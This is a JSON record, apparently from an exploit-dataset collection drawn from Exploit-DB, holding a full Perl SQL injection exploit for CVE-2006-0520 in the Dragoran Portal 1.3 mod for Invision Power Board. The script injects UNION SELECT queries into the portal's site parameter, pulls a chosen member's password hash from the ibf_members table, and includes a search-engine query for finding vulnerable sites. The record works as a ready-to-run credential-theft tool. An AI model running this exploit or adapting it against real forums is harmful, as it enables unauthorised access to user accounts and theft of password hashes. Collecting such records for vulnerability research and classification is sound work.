{
  "id": "1461",
  "title": "Invision Power Board Dragoran Portal Mod 1.3 - SQL Injection",
  "cve": "CVE-2006-0520",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n###########################################\r\n#IPB Portal 1.3->Invision Power Board plugin\r\n#Created By SkOd\r\n#SED security Team , http://sed-team.be\r\n###########################################\r\n#google:\r\n#\"Portal 1.3 by Dragoran\"\r\n###########################################\r\n\r\n\r\n\r\nuse IO::Socket;\r\nif (@ARGV < 3){\r\nprint q{\r\n############################################################\r\n#      IPB Portal 1.3 SQL injection Get Hash Exploit       #\r\n#          Tested on Invision Power Board 1.3.0\t\t   #\r\n#\t    created By SkOd. SED Security Team             #\r\n############################################################\r\n\tipbpro.pl [HOST] [PATH] [Target id]\r\n\t  ipbpro.pl www.host.com /forum/ 2 \r\n############################################################\r\n};\r\nexit;\r\n}\r\n$serv = $ARGV[0];\r\n$dir = $ARGV[1];\r\n$id = $ARGV[2];\r\n\r\n\r\n$serv =~ s/(http:\\/\\/)//eg;\r\n$path = $dir.'index.php?act=portal&site=-999%20UNION%20SELECT%20substring(password,1,10),substring(password,11,20),substring(password,21,30)%20FROM%20ibf_members%20Where%20id='.$id.'/*';\r\n$path2 = $dir.'index.php?act=portal&site=-999%20UNION%20SELECT%20substring(password,31,32),null,null%20FROM%20ibf_members%20Where%20id='.$id.'/*';\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$serv\", PeerPort => \"80\") || die \"[-]Connect Failed\\r\\n\";\r\n\r\nprint \"[+]Connecting...\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $serv\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"[+]Connected\\n\";\r\nprint \"[+]User ID: $id\\n\";\r\nprint \"[+]MD5 Hash: \";\r\nwhile ($answer = <$socket>)\r\n{\r\n$answer =~ s/40%//eg;\r\n$answer =~ s/30%//eg;\r\n$answer =~ m/valign=\"top\" width=\"(.*?)\"/ && print \"$1\";\r\n}\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$serv\", PeerPort => \"80\") || die \"[-]Exploit Failed\\r\\n\";\r\nprint $socket \"GET $path2 HTTP/1.1\\n\";\r\nprint $socket \"Host: $serv\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\nwhile ($answer = <$socket>)\r\n{\r\n$answer =~ s/40%//eg;\r\n$answer =~ s/30%//eg;\r\n$answer =~ m/valign=\"top\" width=\"(.*?)\"/ && print \"$1\";\r\n}\r\n\r\n# milw0rm.com [2006-01-31]",
  "url": "https://www.exploit-db.com/exploits/1461"
}